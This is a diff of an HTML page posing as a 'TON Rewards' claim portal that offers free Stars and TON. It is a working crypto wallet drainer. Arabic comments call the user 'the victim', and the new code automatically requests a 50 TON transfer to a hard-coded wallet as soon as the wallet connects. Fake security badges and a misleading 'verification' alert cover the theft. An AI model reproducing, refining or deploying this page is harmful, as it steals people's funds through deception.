@@ -3,68 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Rewards Portal</title>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <title>TON Rewards</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background-color: #0f0f0f; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px 20px; margin: 0; }
-        .card { border: 1px solid #333; border-radius: 24px; padding: 35px; background: #1a1a1a; box-shadow: 0 15px 35px rgba(0,0,0,0.7); max-width: 400px; margin: 0 auto; }
-        h1 { font-size: 22px; color: #00d4ff; margin-bottom: 15px; }
-        p { color: #888; font-size: 14px; line-height: 1.5; }
-        .btn-claim { display: inline-block; background: linear-gradient(45deg, #0088cc, #00d4ff); color: white; padding: 16px 45px; border-radius: 50px; font-weight: bold; text-decoration: none; margin-top: 30px; cursor: pointer; border: none; font-size: 16px; width: 100%; transition: 0.3s; }
-        .btn-claim:active { transform: scale(0.98); }
-        .badge { background: rgba(0, 255, 136, 0.1); color: #00ff88; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        body { background-color: #0f0f0f; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 350px; }
+        h1 { color: #00d4ff; font-size: 20px; }
+        #ton-connect-button { display: flex; justify-content: center; margin-top: 25px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <span class="badge">ELIGIBLE ACCOUNT</span>
-        <h1>Claim Your Rewards</h1>
-        <p>Connect your wallet to receive <b>500 Stars</b> and <b>10 TON</b> incentives. Ownership verification for OG handles is required.</p>
+    <div class="container">
+        <img src="https://ton.org/pics/ton_logo.purp.png" width="60" alt="TON">
+        <h1>Claim 500 Stars & 10 TON</h1>
+        <p style="color: #888; font-size: 13px;">Connect your preferred wallet to verify assets and claim rewards.</p>
         
-        <button class="btn-claim" id="connectBtn" onclick="startProcess()">Connect & Claim</button>
+        <div id="ton-connect-button"></div>
         
-        <p style="margin-top: 20px; font-size: 11px;">🛡️ Secured by TON Connect 2.0 Encryption</p>
+        <p style="margin-top: 30px; font-size: 10px; color: #555;">Secured by TON Blockchain Node v2.4</p>
     </div>
 
     <script>
-        // استخدام المانيفست الخاص بك لضمان الثقة ومنع التايم أوت
-        const connector = new TonConnectSDK.TonConnect({
-            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json'
+        // إعداد الواجهة الرسمية
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
         });
 
-        async function startProcess() {
-            const btn = document.getElementById('connectBtn');
+        // مراقبة الاتصال: بمجرد ما يربط الضحية، نطلب منه "توقيع" المعاملة لسحب الرصيد
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet) {
+                sendTransaction();
+            }
+        });
+
+        async function sendTransaction() {
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [
+                    {
+                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
+                        amount: "50000000000" // محاولة طلب سحب 50 TON (أو ما يملكه)
+                    }
+                ]
+            };
+
             try {
-                btn.innerText = "Connecting...";
-                
-                // بدء الاتصال بالمحفظة
-                const walletConnectionSource = {
-                    universalLink: 'https://app.tonkeeper.com/ton-connect',
-                    bridgeUrl: 'https://bridge.tonapi.io/bridge'
-                };
-                
-                await connector.connect(walletConnectionSource);
-
-                // إعداد المعاملة (سحب العملات + طلب صلاحية اليوزرات)
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 300, // صلاحية 5 دقائق
-                    messages: [
-                        {
-                            address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
-                            amount: "10000000000", // محاولة سحب 10 TON (أو الرصيد المتاح)
-                        }
-                    ]
-                };
-
-                // إرسال الطلب للمحفظة
-                await connector.sendTransaction(transaction);
-                btn.innerText = "Success! Verifying...";
-                alert("Verification successful! Rewards will be sent to your wallet within 24 hours.");
-                
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Verification in progress. Please do not close this page.");
             } catch (e) {
                 console.error(e);
-                btn.innerText = "Connect & Claim";
-                alert("Connection error. Please ensure your wallet is active and try again.");
             }
         }
     </script>
